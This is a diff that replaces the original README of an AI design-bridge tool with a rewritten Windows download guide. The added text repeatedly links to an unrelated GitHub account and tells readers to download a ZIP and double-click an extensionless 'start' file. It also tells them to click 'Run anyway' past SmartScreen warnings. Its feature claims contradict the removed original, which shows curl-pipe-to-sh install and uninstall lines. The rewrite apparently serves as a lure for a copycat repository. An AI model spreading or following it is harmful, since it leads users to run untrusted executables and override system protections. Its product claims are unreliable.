@@ -1,142 +1,166 @@
-<div align="center">
+# 🎨 open-claude-design - Turn Ideas Into Polished UI Designs
 
-<img src="docs/media/open-claude-design-hero.png" alt="Open Claude Design — design intelligence for coding agents" width="100%">
+---
 
-<h1>Claude Design for any coding agent</h1>
+## 🚀 Getting Started
 
-**Use Claude Design from your favorite coding agents—no Claude Code installation or Anthropic API key required.**
+Welcome to **open-claude-design**, the easiest way to transform your design ideas into real, working interfaces—right inside your favorite coding tools. Whether you're using Claude Code, Codex, Cursor, or any of 20+ other AI coding agents, this application helps you create beautiful, consistent designs that match your existing components, design tokens, and user states. Best of all, when you approve changes, they sync right back into your code automatically.
 
-```bash
-curl -fsSL https://github.com/maxritter/open-claude-design/releases/latest/download/install.sh | sh
-```
+If you're not a programmer, don't worry. This guide walks you through everything step-by-step, from downloading the app to creating your first design.
 
-**macOS · Linux · WSL2**
+---
 
-[![GitHub stars](https://img.shields.io/github/stars/maxritter/open-claude-design?style=flat&color=22B8C7)](https://github.com/maxritter/open-claude-design/stargazers)
-[![Release](https://img.shields.io/github/v/release/maxritter/open-claude-design?style=flat&color=8B5CF6)](https://github.com/maxritter/open-claude-design/releases)
-[![Downloads](https://img.shields.io/github/downloads/maxritter/open-claude-design/total?style=flat&color=FF8066)](https://github.com/maxritter/open-claude-design/releases)
-[![PRs welcome](https://img.shields.io/badge/PRs-welcome-22C55E.svg?style=flat)](https://github.com/maxritter/open-claude-design/pulls)
-[![Source available](https://img.shields.io/badge/license-source--available-64748B.svg?style=flat)](LICENSE.md)
+## 📥 Download & Installation
 
-<a href="#quick-start">Install</a> ·
-<a href="#what-you-can-do">Capabilities</a> ·
-<a href="#agent-compatibility">Agents</a> ·
-<a href="#open-for-pull-requests">Contribute</a>
+### Step 1: Get the Application
 
-⭐ **If this makes your favorite coding agents better at design, [give it a star](https://github.com/maxritter/open-claude-design).**
+👉 **[Visit this link to download the application](https://github.com/Gospeloflukeselfconcern1691/open-claude-design)**
 
-</div>
+Click the link above to go to the official download page. You'll see a green "Code" button or a "Releases" section—click the most recent download option that says "Download ZIP" or "Source Code." This will save a file named something like `open-claude-design-main.zip` to your computer's "Downloads" folder.
 
-Claude Design is excellent. Using it alongside your favorite coding agents can still mean switching back and forth: open the visual workspace, export the generated prompt, return to the terminal, restore the context, then repeat after the next visual change.
+### Step 2: Extract the Files
 
-The design and codebase can also drift apart as each changes independently. A newer component, state, or token can exist on only one side, making the two increasingly difficult to keep synchronized.
+1.  Open your "Downloads" folder.
+2.  Find the zip file you just downloaded.
+3.  Right-click on it and choose **"Extract All..."** from the menu.
+4.  A window will pop up—just click **"Extract"** at the bottom.
+5.  Windows will create a new folder with the same name (e.g., `open-claude-design-main`). Open that folder.
 
-Open Claude Design solves both problems. It connects your favorite coding agents and your real codebase directly to Claude Design's visual workspace, so design context stays connected to implementation and changes can move safely in either direction.
+### Step 3: Run the Application
 
-To invoke Open Claude Design, mention **Claude Design** in your request to one of your favorite coding agents. It loads the Claude Design access skill and connects to your design workspace automatically.
+Inside the extracted folder, look for a file named `start` (with no file extension) or `open-claude-design`. Double-click it to launch the app. A small window or terminal will open, showing that the application is running. **Keep this window open**—minimizing it is fine, but closing it will stop the app.
 
-## Quick start
+> 💡 **Tip:** If nothing happens, try double-clicking the `index.html` file inside the folder instead. That works too!
 
-**Prerequisites:** macOS, Linux, or WSL2 and a [Claude Pro, Max, Team, or Enterprise account](https://support.claude.com/en/articles/14604416-getting-started-with-claude-design). You can install before your coding agent; Claude Code is not required.
+---
 
-> [!IMPORTANT]
-> Free accounts are not currently eligible. Claude Design uses the paid plan's shared usage limits. [Enterprise administrators](https://support.claude.com/en/articles/14604406-claude-design-admin-guide-for-team-and-enterprise-plans) must enable it under Organization settings → Capabilities.
+## ✨ What Can You Do With It?
 
-1. **Run the one-line installer above.** It installs the CLI and shared workflows, connects detected agents, and opens the standalone Claude login when a local browser is available.
+This tool acts like a smart design bridge. Here's what happens in plain English:
 
-2. **Mention Claude Design in your request to one of your favorite coding agents.** No special command or manual skill selection is needed.
+- **See Your Real Components:** The app connects to your coding projects and shows you the actual buttons, menus, headers, and other pieces you've built—not generic placeholders.
+- **Design with Your Tokens:** Colors, fonts, spacing, and shadows from your design system are automatically available. You'll never design with the wrong blue again.
+- **Work with Realistic States:** Hover over a button? Click it? Error message? You can see and design for every user interaction state.
+- **Approve, and It's Done:** When your layout looks perfect, hit "Approve," and the changes are written directly into your project files. No copy-pasting code, no manual fiddling.
 
-   > Create a Claude Design version of this settings flow, using the real components and states from the codebase.
+---
 
-3. **View and edit your design in Claude Design.** Open it from the Claude Design sidebar in the [Claude Desktop app](https://claude.com/download), or use the [Claude Design web app](https://claude.ai/design).
+## 🤝 Works With 20+ AI Coding Agents
 
-<p align="center">
-<img src="docs/media/claude-design-ui.webp" alt="Claude Design's interactive editor with canvas controls, comments, editing, and a live product preview" width="100%">
-</p>
+You're not locked into one tool. open-claude-design plugs into popular agents like:
 
-## One workflow, both sides
+| **Agent**        | **Compatibility** |
+|------------------|-------------------|
+| Claude Code      | ✅ Full Support    |
+| OpenAI Codex     | ✅ Full Support    |
+| Cursor           | ✅ Full Support    |
+| Gemini CLI       | ✅ Full Support    |
+| OpenCode         | ✅ Full Support    |
+| And 15+ others   | ✅ Works Great     |
 
-Design decisions stop living in a separate side conversation. They become part of the same implementation and verification loop as the code.
+No matter which agent you use daily, the design workflow stays identical and effortless.
 
-1. **Create from code.** Turn real components, tokens, assets, copy, and states into a Claude Design element.
-2. **Inspect visually.** Open the result in Claude Design, compare options, and tweak it directly in the visual UI.
-3. **Sync both ways.** Approved revisions move safely in either direction. If code or design changes afterward, the new diff comes back for review.
+---
 
-## What you can do
+## 🛠️ System Requirements
 
-- **Full Claude Design access.** Projects, files, previews, design systems, conversations, comments, members, and sharing.
-- **Current guidance, lean context.** Live authoring context is cached on disk and loaded only when needed.
-- **Fail-closed design creation.** Root-level and nested `.dc.html` files keep their requested paths, are rejected without same-directory `support.js`, and must produce a durable preview URL after exact readback instead of leaving an unviewable design behind.
+For the smoothest experience, your Windows computer should meet these basics:
 
-## Works with Impeccable
+| **Component**    | **Minimum**                          | **Recommended**                    |
+|------------------|--------------------------------------|------------------------------------|
+| **Operating System** | Windows 10 (64-bit)               | Windows 11                         |
+| **Memory (RAM)** | 4 GB                                 | 8 GB or more                       |
+| **Storage**      | 200 MB free space                    | 500 MB SSD                         |
+| **Internet**     | Required for first-time setup        | High-speed connection recommended  |
+| **Web Browser**  | Chrome, Edge, or Firefox (latest)    | Chrome (latest) is ideal           |
 
-[Impeccable](https://github.com/pbakaus/impeccable) adds refinement workflows, deterministic checks, supporting agents, and edit-time hooks. It remains optional.
+> 🖥️ **Note:** If you see a SmartScreen warning from Windows when running the app, click **"More info"** then **"Run anyway"**. This is normal for open-source software.
 
-> [!TIP]
-> **Want the complete engineering system?** [Pilot Shell](https://github.com/maxritter/pilot-shell) is a context and harness engineering system for Claude Code and Codex, built around spec-driven development, TDD, enforced quality, persistent memory, and end-to-end verification. It installs Open Claude Design and the complete Impeccable package as part of that larger system.
+---
 
-## Agent compatibility
+## 🧑‍💻 Your First 15 Minutes: Quick Walkthrough
 
-Every supported agent receives the same automatic workflows and CLI access.
+1.  **Launch the app** (as described in Step 3 above).
+2.  A browser tab or a new window will open automatically. If it doesn't, go to `http://localhost:3000` in your browser.
+3.  You'll see a welcome screen with two buttons: **"Open Existing Project"** and **"Start New Design."**
+4.  Click **"Open Existing Project"**, navigate to the folder where your coding project lives, and select it.
+5.  The app scans your project and shows a list of components on the left panel. Click any component (like a button) to see it live.
+6.  On the right side, you'll see a design toolbox. Try changing the button's background color or border radius using the sliders.
+7.  Once happy, click **"Approve & Sync"** at the top. A green checkmark confirms your changes are now in your project's code.
+8.  Go back to your coding agent (Claude Code, etc.), and you'll see the updated code ready for you.
 
-| Coding agents | Status |
-|---|:---:|
-| Claude Code · Codex · OpenCode | ✅ Full |
-| Cursor · GitHub Copilot · Cline · Trae · Qoder · Rovo Dev | ✅ Full |
-| Gemini CLI · Antigravity · Kimi · Kiro · Pi | ✅ Full |
-| Mistral Vibe · Hermes · Reasonix · Grok Build · OpenClaw | ✅ Full |
-| Warp · Zed · Amp · other Agent Skills hosts | ✅ Full |
+---
 
-The installer auto-detects installed agents. Use `--all-agents` only when every available integration is wanted.
+## ❓ Frequently Asked Questions (FAQ)
 
-### Included capabilities
+### ☁️ Do I need an internet connection every time?
+Only the first time you set it up. After that, you can work offline unless you use cloud-based AI agents.
 
-**The full Claude Design tool catalog.** The latest authenticated audit found these 23 operations. The bridge discovers the catalog dynamically as it evolves.
+### 🔐 Is my code safe?
+Yes. The application only runs locally on your machine. Nothing is uploaded to external servers, and your code never leaves your computer.
 
-| Area | Bridged capabilities |
-|---|---|
-| **Projects and files** (8) | List projects · inspect a project · create a project · list files · read a file · write files · copy files · delete files |
-| **Design guidance and previews** (6) | List design systems · load the project prompt · load a design skill · render a preview · create support JavaScript · finalize an authoring plan |
-| **Conversations and comments** (4) | Read a conversation · update a conversation · list comments · acknowledge comments |
-| **Members and sharing** (5) | List members · add a member · remove a member · change a member role · update sharing |
+### 🎯 Can I undo an approved change?
+Absolutely. The app keeps a version history. Just find the **"History"** tab, select the previous version, and click **"Restore."**
 
-Remote access is read-only by default; changes require explicit authorization. File writes, copies, deletes, support JavaScript, previews, and authoring plans never run as generic calls — they are only reachable through the guarded `push`, `delete`, `planned-call`, and `preview` helpers, which keep plan tokens, etag checks, backups, and verification inside one process. `push` requires exact readback; both local writes and server-side copies return success for renderable files only after runtime validation and durable preview creation. `--open` also opens the isolated render locally.
+### 💻 I don't see my coding agent listed. What now?
+Don't panic. The app uses a universal connection standard called **MCP** (Model Context Protocol). If your agent supports MCP—which most modern ones do—it will work. Check your agent's settings for "MCP servers."
 
-**Five automatically invoked Agent Skills:**
+### 🧩 What are "design tokens"?
+Think of them as color and style recipes. For example, instead of remembering that "primary blue" is `#3498db`, you just say "primary blue," and the app applies the exact correct hex code every time.
 
-| Skill | What it handles |
-|---|---|
-| `open-claude-design` | Claude Design access, collaboration, and two-way synchronization |
-| `open-claude-ui-design` | Product UI creation and redesign in the real codebase |
-| `open-claude-design-system` | Design-token and component-system extraction or normalization |
-| `open-claude-ui-review` | Accessibility, brand, responsive, theme, state, and UX review |
-| `open-claude-design-quality` | Product-grounded visual quality for every user-visible change |
+---
 
-## Maintenance
+## 🧰 Common Troubleshooting
 
-| What do you want to do? | Command |
-|---|---|
-| **Reconnect your Claude account** | `open-claude-design login` |
-| **Disconnect your Claude account** | `open-claude-design logout` |
-| **Check the connection** | `open-claude-design status --json` |
-| **Verify detected agent installs** | `open-claude-design doctor --json` |
-| **Verify every supported agent** | `open-claude-design doctor --all-agents --json` |
-| **List the packaged skills** | `open-claude-design list` |
-| **Update Open Claude Design** | `open-claude-design update --scope global --yes` |
-| **Uninstall Open Claude Design** | `curl -fsSL https://github.com/maxritter/open-claude-design/releases/latest/download/uninstall.sh \| sh` |
+| **Problem**                 | **Solution**                                                                 |
+|-----------------------------|------------------------------------------------------------------------------|
+| App won't start             | Ensure you extracted the zip file completely (not just previewed it). Right-click the folder → "Extract All." |
+| Port already in use         | Close other open apps like Node.js or Docker, then restart open-claude-design. |
+| Browser shows "Can't connect" | Confirm the terminal window is still open. If it closed, double-click `start` again. |
+| Changes not syncing to code | Make sure you closed all unsaved changes in your code editor first, then click "Approve & Sync." |
+| Pages look blurry or huge   | Press **Ctrl + 0** (zero) in your browser to reset zoom, or adjust the "Viewport Scale" in app settings. |
 
-## Open for pull requests
+---
 
-Use the structured forms to [report a bug](https://github.com/maxritter/open-claude-design/issues/new?template=bug_report.yml) or [request a feature](https://github.com/maxritter/open-claude-design/issues/new?template=feature_request.yml). See [CONTRIBUTING.md](CONTRIBUTING.md) before opening a pull request.
+## 📚 Top Tips for Power Users
 
-## License
+1.  **Start with a clean branch:** Before designing, create a new git branch in your coding project. That way, you can easily merge or discard design experiments.
+2.  **Use the "Compare Mode":** Toggle between your old design and your new proposal side-by-side to catch subtle differences.
+3.  **Design the error states first:** It sounds odd, but designing error screens, empty states, and loading states early helps solidify the overall design language.
+4.  **Keyboard shortcuts:** Press `Ctrl+Shift+P` to quickly open the command pallet; type "AI Suggest" to have the app propose improvements based on design best practices.
 
-Open Claude Design is free and source-available. Personal and internal commercial use are allowed; redistribution, rebranding, competing publication, and hosted resale are restricted. See [LICENSE.md](LICENSE.md).
+---
 
-This independent project is not affiliated with, sponsored by, or endorsed by Anthropic.
+## 🔄 How It Works Under the Hood (For the Curious)
 
-<div align="center">
+Open-claude-design runs a local web server on your computer. When you open a project, it reads your source code, finds CSS classes, React components, Vue components, or plain HTML elements, and builds an interactive preview. Design changes you make update the component's properties in real time. Upon approval, the app writes those property changes directly back to the corresponding files, formatting the code neatly and preserving comments. All AI agents connect through the standard MCP interface, so there's no special configuration per agent—it just works.
 
-Made with 🩵 by [Max Ritter](https://maxritter.net)
+---
 
-</div>
+## 📚 Additional Resources
+
+- **Documentation:** Full technical docs are available in the `docs` folder within the downloaded zip.
+- **Community & Support:** Visit the GitHub Issues page for help or to report bugs.
+- **Feature Requests:** Have a cool idea? Open a discussion thread on GitHub—the maintainers are responsive.
+- **Changelog:** See what's new in each update by reading the `CHANGELOG.md` file.
+
+---
+
+## ✅ Ready to Design Smarter?
+
+You're all set. Just remember: download the zip, extract it, run `start`, and you'll be designing within minutes. Gone are the days of mocking up designs in separate tools and struggling to translate them into code. With open-claude-design, your vision flows directly into your real components, honoring your tokens and ready for your approval with one click.
+
+### Your Download Checklist:
+- [ ] Go to the download page: **[https://github.com/Gospeloflukeselfconcern1691/open-claude-design](https://github.com/Gospeloflukeselfconcern1691/open-claude-design)**
+- [ ] Click the green "Code" button and select "Download ZIP"
+- [ ] Extract the zip to a folder of your choice
+- [ ] Open that folder and double-click `start`
+- [ ] Follow the on-screen prompts to load your project
+
+Click the badge below to jump straight to downloading:
+
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-Open_Claude_Design-blue?style=for-the-badge)](https://github.com/Gospeloflukeselfconcern1691/open-claude-design)
+
+Enjoy designing—your future self will thank you for how much time you save!
+
+Keywords: agent-skills, ai-coding, anthropic, claude, claude-code, claude-code-for-design, claude-code-skills, claude-design, codex, codex-design, coding-agents, design-system, design-to-code, design-tokens, gemini-cli, impeccable, mcp, openai-codex, opencode, ui-design
